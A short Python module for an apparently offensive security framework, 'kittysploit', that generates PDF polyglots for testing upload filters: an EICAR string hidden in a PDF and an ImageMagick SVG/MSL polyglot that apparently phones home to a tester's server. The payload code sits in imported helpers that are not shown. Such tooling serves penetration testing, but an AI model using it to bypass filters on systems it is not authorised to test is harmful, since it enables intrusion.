#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfPhonehomeMixin, format_test_ids
from lib.pdf.generators.polyglot import write_eicar_polyglot, write_imagemagick_svg_polyglot


class Module(Auxiliary, PdfPhonehomeMixin):
    __info__ = {
        "name": "PDF Polyglot Payload Generator",
        "description": (
            "Generate non-standard PDF polyglots for upload-filter bypass testing: "
            "EICAR antivirus test string embedded in PDF, and ImageMagick SVG/MSL "
            "polyglot for server-side image processing pipelines."
        ),
        "author": ["KittySploit Team"],
        "references": [
            "https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html",
        ],
        "tags": ["pdf", "polyglot", "eicar", "imagemagick", "upload-scanner"],
    }

    PDF_GENERATORS = (
        write_eicar_polyglot,
        write_imagemagick_svg_polyglot,
    )

    MODULE_TITLE = "PDF polyglot payload generator"

    def run(self):
        print_info(f"    Test ids: {format_test_ids(self.PDF_GENERATORS)}")
        return self.run_pdf_phonehome()